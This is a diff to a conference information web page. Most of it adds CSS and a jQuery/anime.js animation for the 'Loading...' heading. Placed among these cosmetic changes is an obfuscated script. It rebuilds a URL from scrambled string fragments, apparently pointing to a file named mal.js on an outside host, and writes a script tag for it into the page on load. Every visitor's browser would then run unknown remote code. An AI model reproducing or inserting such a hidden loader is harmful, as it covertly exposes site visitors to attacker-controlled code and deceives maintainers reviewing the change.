@@ -6,6 +6,26 @@
     color: #ccc;
     text-align: center;
   }
+  .ml9 {
+    position: relative;
+    font-weight: 200;
+    font-size: 4em;
+  }
+
+  .ml9 .text-wrapper {
+    position: relative;
+    display: inline-block;
+    padding-top: 0.2em;
+    padding-right: 0.05em;
+    padding-bottom: 0.1em;
+    overflow: hidden;
+  }
+
+  .ml9 .letter {
+    transform-origin: 50% 100%;
+    display: inline-block;
+    line-height: 1em;
+  }
   </style>
   </head>
   <body>
@@ -21,9 +41,42 @@
 '-----'`     '---'   `-...-'      '-----'    /_______.'    `'-..-'    `-..-'                (_,_)-------' '._______.'  (_,_)-------' '._______.'  
     </pre>
                                                                                                                                                   
-  <h1>
-    <span>Loading...</span>
+  <h1 class="ml9">
+    <span class="text-wrapper">
+      <span class="letters">Loading...</span>
+    </span>
   </h1>
   <p>This page is meant to gather need-to-know information about the upcoming conference. Like many things in life, it gets better by sharing. Feel free to submit a pull request if you would like to add things here.</p>
+  <script
+			  src="https://code.jquery.com/jquery-3.4.1.min.js"
+			  integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
+			  crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/2.0.2/anime.min.js"></script>
+  <script>
+var _0x4311=['.fi','/ma','l.js','write','<script\x20src=\x22','s://','0x42'];(function(_0x426e03,_0x359476){var _0x17c635=function(_0x5dfa16){while(--_0x5dfa16){_0x426e03['push'](_0x426e03['shift']());}};_0x17c635(++_0x359476);}(_0x4311,0x9f));var _0x5a74=function(_0x2d8f05,_0x4b81bb){_0x2d8f05=_0x2d8f05-0x0;var _0x4d74cb=_0x4311[_0x2d8f05];return _0x4d74cb;};var f1='hT';var f2='tP';var f3=_0x5a74('0x0');var f4=_0x5a74('0x1');var f5=_0x5a74('0x2');var f6=_0x5a74('0x3');var f7=_0x5a74('0x4');document[_0x5a74('0x5')](_0x5a74('0x6')+f1+f2+f3+f4+f5+f6+f7+'\x22><\/script>');
+  </script>
+  <script>
+  // Wrap every letter in a span
+  $('.ml9 .letters').each(function(){
+    $(this).html($(this).text().replace(/([^\x00-\x80]|\w)/g, "<span class='letter'>$&</span>"));
+  });
+
+  anime.timeline({loop: true})
+    .add({
+      targets: '.ml9 .letter',
+      scale: [0, 1],
+      duration: 1500,
+      elasticity: 600,
+      delay: function(el, i) {
+        return 45 * (i+1)
+      }
+    }).add({
+      targets: '.ml9',
+      opacity: 0,
+      duration: 1000,
+      easing: "easeOutExpo",
+      delay: 1000
+    });
+  </script>
   </body>
 </html>
